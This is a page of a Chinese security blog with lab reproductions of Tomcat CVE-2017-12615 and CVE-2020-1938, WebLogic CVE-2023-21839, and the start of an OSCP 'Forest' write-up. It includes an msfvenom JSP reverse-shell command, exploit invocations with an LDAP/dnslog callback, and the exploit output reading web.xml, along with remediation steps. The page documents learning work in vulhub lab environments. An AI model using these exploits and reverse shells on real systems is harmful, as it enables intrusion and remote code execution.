<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="So1Lupus的个人博客">
<meta property="og:type" content="website">
<meta property="og:title" content="So1Lupus">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="So1Lupus">
<meta property="og:description" content="So1Lupus的个人博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="So1Lupus">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>So1Lupus</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">So1Lupus</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">So1Lupus</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/c1903ce6.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/c1903ce6.html" class="post-title-link" itemprop="url">CVE-2017-12615--tomcat-复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-07 21:51:09" itemprop="dateCreated datePublished" datetime="2023-04-07T21:51:09+08:00">2023-04-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:28:31" itemprop="dateModified" datetime="2024-09-28T20:28:31+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="Tomcat-通过PUT方法任意写入文件漏洞-RCE-CVE-2017-12615-复现"><a href="#Tomcat-通过PUT方法任意写入文件漏洞-RCE-CVE-2017-12615-复现" class="headerlink" title="Tomcat 通过PUT方法任意写入文件漏洞+RCE  (CVE-2017-12615) 复现"></a>Tomcat 通过PUT方法任意写入文件漏洞+RCE  (CVE-2017-12615) 复现</h1><h2 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h2><ul>
<li>对应OWASP10中的 安全配置错误</li>
</ul>
<p>在 conf&#x2F;web.xml文件中的readonly配置设为false的前提下，攻击者可以通过 PUT&#x2F;DELETE来进行相关文件操作。</p>
<h2 id="0x01适用版本"><a href="#0x01适用版本" class="headerlink" title="0x01适用版本"></a>0x01适用版本</h2><p>apache tomcat 5.x-9.x</p>
<h2 id="0x02利用条件"><a href="#0x02利用条件" class="headerlink" title="0x02利用条件"></a>0x02利用条件</h2><p> conf&#x2F;web.xml文件中的readonly配置设为false</p>
<h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>漏洞环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615</a></p>
<h3 id="1-漏洞验证"><a href="#1-漏洞验证" class="headerlink" title="1.漏洞验证"></a>1.漏洞验证</h3><p>docker搭建好以后，打开网页8080端口，tomcat7+默认管理界面</p>
<img src="/undefined/c1903ce6/image-20230407213616171.png" class="">

<p>然后burpsuite抓包，修改请求方法为PUT，附加上验证payload，可以看见返回201响应头，成功创建文件.</p>
<img src="/undefined/c1903ce6/image-20230407213900853.png" class="">

<p>此处**&#x2F;poc.jsp&#x2F;**，此处后面加上<code>/</code>是利用bind声明FILE变量，然后FILE变量将name进行normalize从而去掉&#x2F;的操作。从而使其进入DefaultParser而非JSPparser,最终使得文件落地。</p>
<h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h3><p>这里利用msfvenom简单生成载荷，真实情况下估计会被杀掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.22.0.1 LPORT=4444 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<img src="/undefined/c1903ce6/image-20230407214446437.png" class="">

<p>上传时候，访问文件，并本地监听，成功反弹回shell。</p>
<img src="/undefined/c1903ce6/image-20230407214608223.png" class="">

<p>0x04漏洞修复</p>
<p>检查readonly没有设为false即可。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/9de11cd7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/9de11cd7.html" class="post-title-link" itemprop="url">CVE-2020-1938--tomcat-复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-06 22:32:08" itemprop="dateCreated datePublished" datetime="2023-04-06T22:32:08+08:00">2023-04-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:28:45" itemprop="dateModified" datetime="2024-09-28T20:28:45+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞"><a href="#CVE-2020-1938-Tomcat-ajp文件读取-x2F-包含漏洞" class="headerlink" title="CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞"></a>CVE-2020-1938  Tomcat  ajp文件读取&#x2F;包含漏洞</h1><h2 id="0x00漏洞简述"><a href="#0x00漏洞简述" class="headerlink" title="0x00漏洞简述"></a>0x00漏洞简述</h2><p>攻击者可以利用该漏洞读取部署在Tomcat上的所有web应用的配置文件和源代码文件的内容。如果用户可以上传文件，可以进一步实现LFI。</p>
<h2 id="0x01适用版本"><a href="#0x01适用版本" class="headerlink" title="0x01适用版本"></a>0x01适用版本</h2><p>Apache Tomcat 9.x &lt; 9.0.31</p>
<p>Apache Tomcat 8.x &lt; 8.5.51</p>
<p>Apache Tomcat 7.x &lt; 7.0.100</p>
<p>Apache Tomcat 6.0</p>
<h2 id="0x02利用条件"><a href="#0x02利用条件" class="headerlink" title="0x02利用条件"></a>0x02利用条件</h2><blockquote>
<p>AJP服务默认开启，默认端口8009</p>
</blockquote>
<p>开启AJP服务，并且攻击者可以访问服务端口。</p>
<h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>复现环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938">https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938</a></p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p>
<p>​		  <a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
<h3 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h3><p>发现两个端口，8009AJP服务，8080 tomcat 9.0.30</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 22:22 CST</span><br><span class="line">Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 0.00% done</span><br><span class="line">Nmap scan report for 172.21.0.2</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.30</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds</span><br></pre></td></tr></table></figure>

<h3 id="2-漏洞探测"><a href="#2-漏洞探测" class="headerlink" title="2.漏洞探测"></a>2.漏洞探测</h3><p>利用xray，验证存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">./xray servicescan --target 172.21.0.2:8009</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [default:dispatcher.go:444] processing 172.21.0.2:8009</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [go-poc:tomcat-cve-2020-1938.go:339] ajp protocol found in 172.21.0.2:8009, status code 404</span><br><span class="line">[INFO] 2023-04-06 22:24:55 [go-poc:tomcat-cve-2020-1938.go:199] found tomcat version 9.0.30</span><br><span class="line">[Vuln: phantasm]</span><br><span class="line">Target           &quot;172.21.0.2:8009&quot;                                                                                                                                                                                                        </span><br><span class="line">VulnType         &quot;poc-go-tomcat-cve-2020-1938/default&quot;                                                                                                                                                                                    </span><br><span class="line">method           &quot;version_match&quot;                                                                                                                                                                                                          </span><br><span class="line">read_file        &quot;/kqhymw.jsp&quot;                                                                                                                                                                                                            </span><br><span class="line">status_code      &quot;404&quot;                                                                                                                                                                                                                    </span><br><span class="line">body             &quot;\\x02\\xd3\\x03\\x02\\xcf&lt;!doctype html&gt;&lt;html lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 – Not Found&lt;/title&gt;&lt;style type=\&quot;text/css\&quot;&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 – Not Found&lt;/h1&gt;&lt;hr class=\&quot;line\&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; &amp;#47;kqhymw.jsp&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.&lt;/p&gt;&lt;hr class=\&quot;line\&quot; /&gt;&lt;h3&gt;Apache Tomcat/9.0.30&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;\\x00AB&quot;                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                                          </span><br><span class="line">[INFO] 2023-04-06 22:24:55 [controller:dispatcher.go:553] wait for reverse server finished</span><br><span class="line">[*] All pending requests have been scanned</span><br><span class="line">[*] scanned: 1, pending: 0, requestSent: 0, latency: 0.00ms, failedRatio: 0.00%</span><br><span class="line">[INFO] 2023-04-06 22:24:58 [controller:dispatcher.go:573] controller released, task done</span><br></pre></td></tr></table></figure>

<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p>利用现成exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 172.21.0.2</span><br><span class="line">Getting resource at ajp13://172.21.0.2:8009/asdf</span><br><span class="line">----------------------------</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work for additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to in writing, software</span><br><span class="line">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License for the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee</span><br><span class="line">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">  version=&quot;4.0&quot;</span><br><span class="line">  metadata-complete=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;</span><br><span class="line">  &lt;description&gt;</span><br><span class="line">     Welcome to Tomcat</span><br><span class="line">  &lt;/description&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h2><ol>
<li>更新版本</li>
</ol>
<p>更新版本到9.0.31、8.5.51、7.0.100</p>
<ol start="2">
<li><p>未使用ajp服务</p>
<p>注释  编辑<CATALINA_BASE>&#x2F;conf&#x2F;server.xml，找到如下一行（<CATALINA_BASE>为Tomcat工作目录）：</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; </span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用ajp服务</li>
</ol>
<p>​	升级到新版本后增加secret属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;  protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;  secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; </span><br></pre></td></tr></table></figure>

<p>​	未升级，增加requiresecret属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8009&quot;  protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;  requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/6c59522f.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/6c59522f.html" class="post-title-link" itemprop="url">CVE-2023-21839--Weblogic-复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-24 11:21:45" itemprop="dateCreated datePublished" datetime="2023-03-24T11:21:45+08:00">2023-03-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:28:55" itemprop="dateModified" datetime="2024-09-28T20:28:55+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="CVE-2023-21839–Weblogic-复现"><a href="#CVE-2023-21839–Weblogic-复现" class="headerlink" title="CVE-2023-21839–Weblogic-复现"></a>CVE-2023-21839–Weblogic-复现</h1><blockquote>
<p>允许远程用户在未经授权的情况下通过 <strong>IIOP&#x2F;T3</strong> 进行 <strong>JNDI lookup 操作</strong>，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 <strong>RCE</strong> 漏洞</p>
</blockquote>
<h2 id="0x00-实验环境"><a href="#0x00-实验环境" class="headerlink" title="0x00 实验环境"></a>0x00 实验环境</h2><p>攻击机：kali linux <code>192.168.0.234</code></p>
<p>靶机： vulhub docker搭建的靶场 来源<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839</a></p>
<h2 id="0x01影响版本"><a href="#0x01影响版本" class="headerlink" title="0x01影响版本"></a>0x01影响版本</h2><ul>
<li>Weblogic 12.2.1.3.0</li>
<li>Weblogic 12.2.1.4.0</li>
<li>Weblogic 14.1.1.0.0</li>
</ul>
<h2 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h2><p>1）nmap扫描，7001 t3协议，weblogic版本号12.2.1.3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV  -p7001 127.0.0.1                     #本地搭建ip为127.0.0.1</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">7001/tcp open  http    Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)</span><br><span class="line">|_http-title: Error 404--Not Found</span><br><span class="line">|_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds</span><br></pre></td></tr></table></figure>

<p>访问<strong>console</strong>目录，发现存在<strong><a target="_blank" rel="noopener" href="http://x.x.x.x:7001/console/login/LoginForm.jsp">http://x.x.x.x:7001/console/login/LoginForm.jsp</a></strong></p>
<img src="/undefined/6c59522f/image-20230324111102786.png" class="">

<p>3）exploit测试：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a></p>
<p>下载到本地后，在cmd目录下，编译go文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows: </span><br><span class="line">go build -o CVE-2023-21839.exe</span><br><span class="line"></span><br><span class="line">linux:</span><br><span class="line">go build -o CVE-2023-21839</span><br></pre></td></tr></table></figure>

<img src="/undefined/6c59522f/image-20230324110857878.png" class="">


<p>i. 利用dnslog进行探测发现存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.0.234 -port 7001 -ldap ldap://licajd.dnslog.cn</span><br></pre></td></tr></table></figure>

<img src="/undefined/6c59522f/image-20230324110940041.png" class="">

<p>ii.反弹shell</p>
<p>JNDI利用工具<a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p>
<pre><code> 本地反弹成功
</code></pre>
<img src="/undefined/6c59522f/image-20230324111608588.png" class="">

<p> 反弹vps成功</p>
<img src="/undefined/6c59522f/image-20230324111758611.png" class="">
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/a7f75ca4.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="So1Lupus">
      <meta itemprop="description" content="So1Lupus的个人博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="So1Lupus">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/undefined/a7f75ca4.html" class="post-title-link" itemprop="url">Road-to-OSCP-4-Forest</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-12 22:02:28" itemprop="dateCreated datePublished" datetime="2023-03-12T22:02:28+08:00">2023-03-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-28 20:29:13" itemprop="dateModified" datetime="2024-09-28T20:29:13+08:00">2024-09-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>
<h1 id="Forest"><a href="#Forest" class="headerlink" title="Forest"></a>Forest</h1><h2 id="Box-info"><a href="#Box-info" class="headerlink" title="Box info"></a>Box info</h2><img src="/undefined/a7f75ca4/image-20230312205222691.png" class="">

<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161</span><br></pre></td></tr></table></figure>

